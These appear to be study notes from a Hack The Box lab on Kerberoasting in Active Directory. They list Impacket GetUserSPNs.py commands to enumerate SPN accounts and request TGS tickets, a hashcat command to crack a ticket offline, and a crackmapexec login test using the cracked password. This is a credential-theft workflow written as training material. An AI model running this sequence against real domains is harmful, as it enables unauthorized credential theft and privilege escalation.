- Kerberoasting is a lateral/privilege escalation technique in Active Directory environments. 
- Kerberoasting targets the Service Principal Names (SPN) accounts. 

### Performing the Attack - Kerberoasting

We first need to acknowledge our current position on the network: 
...
Obtaining the TGS Ticket does not guarantee us a set of valid credentials, and the ticket must still be cracked offline using tools such as Hashcat to crack. 

### Efficacy of the Attack
- We may gain a bunch of TGS Tickets to crack offline, however some may be able to crack yet those accounts aren't any privileged accounts. Or we may attempt to crack a TGS Ticket and may come up empty with no password. 

### Kerberoasting with GetUserSPNs.py
- Part of the Impacket toolkit, allows us to gather the Users SPNs. 

**Installing Impacket using Pip**
```shell-session
realCustampin@htb[/htb]$ sudo python3 -m pip install .
...
```shell-session
realCustampin@htb[/htb]$ GetUserSPNs.py -h
...
REMINDER!!! In order for us to start, we need a set of valid Domain Credentials for either a domain user or a Domain Admininstrator!!!

**Listing SPN Accounts with GetUserSPNs.py**
```shell-session
realCustampin@htb[/htb]$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend
...
```shell-session
realCustampin@htb[/htb]$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request 
...
```shell-session
realCustampin@htb[/htb]$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev
...
**Writing the TGS Ticket to A File**
```shell-session
realCustampin@htb[/htb]$ GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs
...
**Cracking the Ticket Offline Using Hashcat**
```shell-session
realCustampin@htb[/htb]$ hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt 
...
**Testing Authentication Against Domain Controller**
```shell-session
realCustampin@htb[/htb]$ sudo crackmapexec smb 172.16.5.5 -u sqldev -p database!
